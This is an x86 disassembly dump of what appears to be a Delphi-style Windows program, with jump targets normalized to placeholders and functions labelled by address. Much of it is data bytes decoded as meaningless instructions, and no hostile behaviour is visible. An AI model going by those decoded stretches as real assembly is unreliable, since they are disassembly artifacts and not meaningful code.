jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_42b0c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b384
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_413d6c
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_413d6c
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_42b410
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42b4d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_42b30c
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_42b0c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b4e0
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_413d6c
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413d6c
pop edx
call sub_43a37c
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_42b4e8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_440014
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_413d6c
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_42b55c
xchg [ fs : esi ] al
inc [ es : eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
xchg [ fs : esi ] al
sub eax 0x640000ff
xchg [ esi ] al
inc [ cs : eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
xchg [ fs : esi ] al
adc eax 0x640000ff
xchg [ esi ] al
push ss
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
xchg [ fs : esi ] al
sbb eax 0x640000ff
xchg [ esi ] al
push ds
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
xchg [ fs : esi ] al
add eax 0x640000ff
xchg [ esi ] al
push es
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
xchg [ fs : esi ] al
or eax 0x640000ff
xchg [ esi ] al
push cs
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah dh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ ecx + ebp * 2 + 0x46 ] bh
add ah cl
mov dh 0x42
add [ ecx + ebp * 2 + 0x46 ] dh
add ah al
mov dh 0x42
add [ ecx + ebp * 2 + 0x46 ] ch
add [ esi + esi * 4 + 0x69640042 ] bh
inc esi
add [ esi + esi * 4 + 0x695c0042 ] dh
inc esi
add [ esi + esi * 4 + 0x69540042 ] ch
inc esi
add [ esi + esi * 4 + 0x694c0042 ] ah
inc esi
add [ esi + esi * 4 + 0x69440042 ] bl
inc esi
add [ esi + esi * 4 + 0x693c0042 ] dl
inc esi
add [ esi + esi * 4 + 0x69340042 ] cl
inc esi
add [ esi + esi * 4 + 0x692c0042 ] al
inc esi
add [ esi + esi * 4 + 0x42 ] bh
add [ ecx + ebp * 2 ] ah
inc esi
add [ esi + esi * 4 + 0x42 ] dh
add [ ecx + ebp * 2 ] bl
inc esi
add [ esi + esi * 4 + 0x42 ] ch
add [ ecx + ebp * 2 ] dl
inc esi
add [ esi + esi * 4 + 0x42 ] ah
add [ ecx + ebp * 2 ] cl
inc esi
add [ esi + esi * 4 + 0x42 ] bl
add [ ecx + ebp * 2 ] al
inc esi
add [ esi + esi * 4 + 0x42 ] dl
add ah bh
push 0xb64c0046
inc edx
add ah dh
push 0xb6440046
inc edx
add ah ch
push 0xb63c0046
inc edx
add ah ah
push 0xb6340046
inc edx
add ah bl
push 0xb62c0046
inc edx
add ah dl
push 0xb6240046
inc edx
add ah cl
push 0xb61c0046
inc edx
add ah al
push 0xb6140046
inc edx
add [ eax + ebp * 2 - 0x49f3ffba ] bh
inc edx
add [ eax + ebp * 2 - 0x49fbffba ] dh
inc edx
add [ eax + ebp * 2 - 0x4a03ffba ] ch
inc edx
add [ eax + ebp * 2 - 0x4a0bffba ] ah
inc edx
add [ eax + ebp * 2 - 0x4a13ffba ] bl
inc edx
add [ eax + ebp * 2 - 0x4a1bffba ] dl
inc edx
add [ eax + ebp * 2 - 0x4a23ffba ] cl
inc edx
add [ eax + ebp * 2 - 0x4a2bffba ] al
inc edx
add [ eax + ebp * 2 + 0x46 ] bh
add ah cl
mov ch 0x42
add [ eax + ebp * 2 + 0x46 ] dh
add ah al
mov ch 0x42
add [ eax + ebp * 2 + 0x46 ] ch
add [ ebp + esi * 4 + 0x68640042 ] bh
inc esi
add [ ebp + esi * 4 + 0x685c0042 ] dh
inc esi
add [ ebp + esi * 4 + 0x68540042 ] ch
inc esi
add [ ebp + esi * 4 + 0x684c0042 ] ah
inc esi
add [ ebp + esi * 4 + 0x68440042 ] bl
inc esi
add [ ebp + esi * 4 + 0x683c0042 ] dl
inc esi
add [ ebp + esi * 4 + 0x68340042 ] cl
inc esi
add [ ebp + esi * 4 + 0x682c0042 ] al
inc esi
add [ ebp + esi * 4 + 0x42 ] bh
add [ eax + ebp * 2 ] ah
inc esi
add [ ebp + esi * 4 + 0x42 ] dh
add [ eax + ebp * 2 ] bl
inc esi
add [ ebp + esi * 4 + 0x42 ] ch
add [ eax + ebp * 2 ] dl
inc esi
add [ ebp + esi * 4 + 0x42 ] ah
add [ eax + ebp * 2 ] cl
inc esi
add [ ebp + esi * 4 + 0x42 ] bl
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42b88c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b893
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_4048dc
sub_42b8c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b8ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b8f4
retn
sub_42b900
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b931
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b938
retn
mov eax [ rw-data ]
call sub_403104
sub_42b9cc
sar [ ecx + 0xd030042 ] 0x1
push esp
inc edx
jne r-xdata
add [ eax ] al
je r-xdata
inc ebx
add [ eax ] ch
inc ebx
inc ecx
add [ eax - 0x28 ] cl
inc edx
add [ eax + ebx * 4 ] bl
inc ebx
add [ eax + 0x34004397 ] cl
mov eax [ 0xffffffff9fdc0043 ]
inc edx
jne r-xdata
inc edx
add [ eax + eax ] ah
add [ eax ] al
adc [ ebx + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec esp
popad
jns r-xdata
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ edx + edx * 8 - 0x4d3bffbe ] dh
inc ebx
add al al
mov dl 0x43
add [ eax - 0x6fffbc4d ] dl
xchg esi eax
inc ebx
add ah dl
popfd
inc ebx
add [ eax ] bh
popfd
inc ebx
add [ eax - 0x5a ] ah
inc ebx
add al bl
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add ah cl
lds eax [ ebx ]
clc
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x200043a2 ] ch
mov [ 0xffffffffa5340043 ] al
inc ebx
add al ah
mov [ 0xffffffffb5c00043 ] eax
inc ebx
add [ esi + eax * 8 + 0x43 ] bh
add [ eax ] ah
test al 0x43
add [ eax + 0x80043a8 ] cl
cdq
inc ebx
add [ eax + ebp * 4 + 0x43 ] dh
add [ ebx + edx * 8 + 0x100042 ] ch
add eax [ edx ]
or al 0xb0
sbb [ eax - 0x4ff14ffa ] dh
adc dh [ eax - 0x4fec4fdc ]
adc al 0xb0
out dx eax
inc ebx
add ah bl
lahf
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xbb
jne r-xdata
add [ ecx ] dh
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x42bb7090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 4 + 0x42 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xbc620042
inc edx
add [ ecx + eax + 0x67d00000 ] al
inc ebx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ edi + esi * 4 + 0x43 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ ebx + edx * 8 + 0x42 ] dh
add [ esp + eax * 8 ] dh
inc ebx
add [ eax + edi * 4 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah cl
mov ecx 0x620b0042
insb
inc edi
insb
jns r-xdata
add [ ebx + edi * 4 ] cl
push 0x7466654c
or al 0x62
insb
inc edi
insb
jns r-xdata
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax - 0x2bffbe60 ] dh
rol [ edx ] 0x1
in al 0xa0
push 0x68676952
je r-xdata
or eax 0x6c476c62
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
mov eax [ 0xffffffff935c0041 ]
inc ebx
add [ eax - 0x60 ] ch
add [ eax - 0x4fffbfd0 ] bh
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
mov al [ 0xffffffffd1d40041 ]
inc edx
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xb0004030
jns r-xdata
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
inc ecx
add [ eax + 0x18004392 ] dh
je r-xdata
add ah ah
mov al [ 0xffffffff92b00041 ]
inc ebx
add [ eax ] bl
outsb
jae r-xdata
adc [ eax - 0x40 ] ch
mov ecx 0xe9c30042
0xebfffd7e 0x5df8
retn
shr [ edx + edi * 4 ] 0x42
add [ ecx ] al
or dl [ esi + ecx * 2 + 0x75 ]
insd
inc edi
insb
jns r-xdata
inc ecx
add ah bh
mov al [ 0xffffffffa1500041 ]
inc ecx
add [ ecx + edx * 4 - 0x2e07ffbd ] bl
inc edx
add [ eax ] dl
xchg edx eax
inc ebx
add [ edx + edx * 8 + 0x42 ] al
add al al
push 0x93880044
inc ebx
add [ edx + edx * 4 + 0x43 ] al
add ah bh
push 0x69100044
inc esp
add [ edx + edx * 4 + 0x43 ] bh
add [ eax ] bh
imul eax [ eax + eax - 0x28 ] 0x74004392
rol [ edx ] cl
clc
xchg edx eax
inc ebx
add [ edx + edx * 8 - 0x6bf3ffbe ] dl
inc ebx
add ah ch
xchg ebx eax
inc ebx
add [ esp + edx * 4 ] ch
inc ebx
add [ eax ] bl
xchg ebx eax
inc ebx
add [ ecx + ebp * 2 + 0x44 ] bl
add [ eax + 0x69 ] ah
inc esp
add [ ebx + edx * 4 ] bh
inc ebx
add [ eax + edx * 4 + 0x54160043 ] ch
push ebx
jo r-xdata
push 0x10173
add [ eax ] al
add al 0x0
add [ eax ] al
lea eax [ eax ]
nop
mov edx 0x42
sub_42be36
fild [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
add [ edx - 0x3f010000 ] bl
movsb [ edi ] [ esi ]
jne r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
push cs
push eax
popad
jb r-xdata
cmp al 0x10
inc eax
add [ ecx + eax ] bh
jmp eax
push esp
jb r-xdata
adc [ eax ] al
je r-xdata
jne r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
and [ ebx ] 0x0
outsb
jae r-xdata
inc [ eax ]
fadd [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
pop ds
add [ edi ] al
push ebx
jo r-xdata
add bh bh
add ah bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ edi ] bl
adc [ eax ] al
cdq
add [ eax ] al
[ esp - 0x5b9bffbd ]
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc edx
add [ eax - 0x6c000000 ] cl
insb
inc ebx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ edx + eax * 8 ] bh
inc edx
add [ ecx + eax * 4 - 0x7ae3ffbc ] dl
inc esp
add ah dl
add [ eax + eax - 0x5c ] 0x9c
inc ecx
add [ eax - 0x65 ] dh
inc ecx
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add al cl
jb r-xdata
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
sbb al 0xdc
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
add [ eax + 0x42c1 ] al
add al cl
jl r-xdata
xor al 0x57
inc ebx
add al bl
add [ eax ] al
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
insb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x80042c1 ] al
add [ eax ] al
add [ eax + 0x4c004010 ] ah
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0x58004030
retn
add [ eax ] al
add [ eax ] ch
and al 0x44
add al dl
mov [ eax + eax + 0x5c ] eax
mov al [ eax + eax + 0x6c ]
and eax 0x540a0044
inc edi
insb
jns r-xdata
adc [ eax ] al
push edi
add [ eax ] al
[ edx + 0x43 ]
inc eax
add [ eax - 0x3d ] bl
inc edx
add [ ebx ] cl
push esp
inc edi
insb
jns r-xdata
push 0x7473694c
nop
adc al 0xc1
inc edx
add [ edi ] al
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
jb r-xdata
push 0x68636143
fadd st1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x7473694c
rol al 0x42
add [ eax ] dh
insd
inc ebx
add [ eax + eax ] cl
pop es
inc edx
jne r-xdata
das
dec [ ebx - 0x740f7426 ]
inc ebp
or [ eax + 0x33 ] dl
ror [ ebx - 0x4ef5173a ] cl
add [ eax ] eax
dec [ ebx - 0x31d7f2d ]
je r-xdata
add [ eax ] al
add [ eax + 0x4c004010 ] ah
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xac004030
les eax [ edx ]
or al 0x54
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd st1
inc edx
add [ eax ] dh
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
pop esi
pop ebx
retn
mov eax esi
call sub_403478
mov dl 0x6e
std
outsb
inc edi
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
rol [ edx ] 0x30
outsb
jae r-xdata
mov eax esi
call sub_447368
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_447314
add esp 0xfffffff0
call sub_403428
sub_42c1e8
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_447314
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_42c23c
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_447368
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_42c26c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_414284
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_414240
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_44779c
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_41419c
sub_42c2b8
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42c26c
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_4479a8
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42c2e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_41426c
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_414240
sub_42c314
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030d4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_42c358
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_42c388
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c1e8
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413c10
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413d6c
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42c3e8
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_413eb0
mov eax ebx
call sub_403104
sub_42c418
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4030d4
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42c54c
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_403428
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c314
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_42c4ac
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403104
mov eax esi
call sub_42c508
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_42c40c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
mov eax [ rw-data ]
call sub_403104
xor eax eax
mov [ rw-data ] eax
sub_42c508
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_42c2e4
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_42c3e8
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_42c54c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_422370
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_42c508
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_42c57c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_42c508
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_422370
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_42c5f4
mov eax 0x1
sub_42c5f4
push ebx
push esi
